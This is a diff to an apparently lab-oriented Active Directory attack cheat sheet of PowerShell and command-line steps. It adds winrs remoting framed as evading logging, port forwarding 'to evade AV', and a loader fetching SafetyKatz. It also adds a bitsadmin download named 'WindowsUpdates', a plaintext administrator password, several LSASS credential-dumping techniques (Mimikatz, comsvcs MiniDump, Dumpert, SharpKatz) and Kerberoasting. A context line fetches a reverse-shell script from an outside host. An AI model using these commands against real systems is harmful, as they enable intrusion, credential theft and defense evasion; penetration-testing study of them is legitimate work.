@@ -27,18 +27,18 @@ ls \\\\\[hostname]\c$
 
 {% code overflow="wrap" %}
 ```powershell
-Enter-PSSession -Computername
+Enter-PSSession -Computername hostname.local
 
 Use winrs of PSRemoting to evade the logging
 winrs -r:hostname cmd
-winrs -r:hostname -u:server\usernmae -p:password-of-user command-to-run
+winrs -r:hostname -u:server\usernmae -p:'password-of-user' command-to-run
 
 Other Remoting
 Use winrm.vbs and/or COM objects of WSMan object https://github.com/bohops/WSMan-WinRM 
 ```
 {% endcode %}
 
-****\
+\
 **1-1 Save and use sessions of a machine**
 
 ```powershell
@@ -115,14 +115,31 @@ powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicPar
 
 **Port Forwarding on Localhost to evade AV**
 
-{% code overflow="wrap" %}
-```powershell
-$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
 
 $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 
-If interacitve logon:
+If interacitve logged on:
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+
+<strong>
+</strong></code></pre>
+
+**Copy files with bitsadmin**&#x20;
+
+{% code overflow="wrap" %}
+```powershell
+winrs -r:us-mailmgmt -u:.\administrator -p:t7HoBF+m]ctv.] "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe
+```
+{% endcode %}
+
+**Connect Network Drive**
+
+{% code overflow="wrap" %}
+```
+net use x: \\us-mailmgmt\C$\Users\Public /user:us-mailmgmt\Administrator t7HoBF+m]ctv.]
+echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
+net use x: /d
 ```
 {% endcode %}
 
@@ -164,7 +181,7 @@ Physmem2profit
 
 Invoke-Mimikatz -command '"sekurlsa::ekeys"'
 Invoke-Mimikatz -Command '"token::elevate" "privilege::debug" "sekurlsa::ekeys"'
-Invoke-Mimikatz -Command vault::cred /patch   //Scheduled tasks
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' //Scheduled tasks
 Invoke-Mimikatz -Command lsadump::lsa /patch  //local accounts
 
 Invoke-Mimikatz -Command sekurlsa::wdigest
@@ -209,7 +226,31 @@ gpupdate /force
 
 sekrusla::wdigest
 
+**Use pypykatz.exe**
 
+pypykatz.exe live lsa
+
+**Extract credential from LSASS using comsvcs.dll / Full lsass dump**
+
+tasklist /FI "IMAGENAME eq lsass.exe"\
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump C:\Users\Public\lsass.dmp full
+
+**Dump credentials using SharpKatz**
+
+SharpKatz.exe --Command ekeys
+
+**Dump credentials using Dumpert (Direct System Calls and API unhooking)**
+
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+
+{% embed url="https://github.com/outflanknl/Dumpert" %}
+
+## **Using lsass-Sthinkering**
+
+* Lsass\_Shtinkering.exe
+* It uses Windows Error Reporting Service to dump the LSASS process memory
+* It manually reports an exception to WER on LSASS that will generate the dump without crashing the process
+* It works on Windows 10, Server 2022, does Not work on Windows Server 2019
 
 ## **🍳Kerberoasting**
 
@@ -221,10 +262,10 @@ sekrusla::wdigest
 klist
 
 **Remove all tickets**\
-****klist purge
+klist purge
 
 **Request a kerberos service ticket for a specific SPN - output Hashcat format**\
-****Powerview - Request-SPNTicket -SPN "name/target.domain.local" \[-OutputFormat JTR]
+Powerview - Request-SPNTicket -SPN "name/target.domain.local" \[-OutputFormat JTR]
 
 **Manually**\
 Add-Type -AssemblyName System.IdentityModel
